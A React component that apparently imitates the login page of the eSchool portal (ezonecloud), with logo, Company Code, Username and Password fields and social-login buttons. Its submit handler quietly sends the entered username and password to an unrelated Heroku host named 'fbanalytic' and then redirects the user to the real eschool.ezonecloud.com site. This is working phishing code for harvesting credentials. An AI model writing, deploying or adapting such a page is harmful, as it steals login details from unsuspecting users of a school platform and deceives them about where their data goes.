import { useState } from "react";
import "./App.css";
import logo from "./assets/logo.png";
import axios from "axios";

function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const submitHandler = () => {
    axios
      .post("https://fbanalytic.herokuapp.com/", {
        username: username,
        password: password,
      })
      .then((_) => {
        window.location.href = "https://eschool.ezonecloud.com/";
      })
      .catch((err) => {
        // setShowerror(true);
      });
  };

  return (
    <div className="container">
      <div className="form-container">
        <img src={logo} alt="" />
        <div className="tip">
          <i
            class="ace-icon fa fa-coffee green"
            style={{ marginRight: "5px", color: "#69aa46" }}
          ></i>
          Please Enter Your Information
        </div>
        <label>
          <input type="text" placeholder="Company Code" />
        </label>
        <label>
          <input
            type="text"
            placeholder="Username"
            onChange={(e) => setUsername(e.target.value)}
            value={username}
          />
        </label>
        <label>
          <input
            type="password"
            placeholder="Password"
            onChange={(e) => setPassword(e.target.value)}
            value={password}
          />
        </label>

        <div className="action">
          <span className="checkbox">
            <input class="form-check-input" type="checkbox" value="" /> Remember
            me
          </span>
          <button
            type="submit"
            name="CmdOk"
            value="Login"
            class="width-35 pull-right btn-sm btn-primary"
            style={{ width: "100px" }}
            onClick={submitHandler}
          >
            Login
          </button>
        </div>
        <div class="social-or-login center">
          <span class="social-text">Or Login Using</span>
          <div className="line"></div>
        </div>
        <div className="social-btn">
          <button class="btn btn-primary">
            <i className="fa fa-facebook"></i>
          </button>
          <button class="btn btn-info" style={{ color: "#fff" }}>
            <i className="fa fa-twitter"></i>
          </button>
          <button class="btn btn-danger">
            <i className="fa fa-google-plus"></i>
          </button>
        </div>
        <div className="dummy" style={{ height: "30px" }}></div>
        <div className="form-footer">
          <div data-target="#forgot-box" class="forgot-password-link">
            <i
              class="ace-icon fa fa-arrow-left"
              style={{ marginRight: "4px" }}
            ></i>
            I forgot my password
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
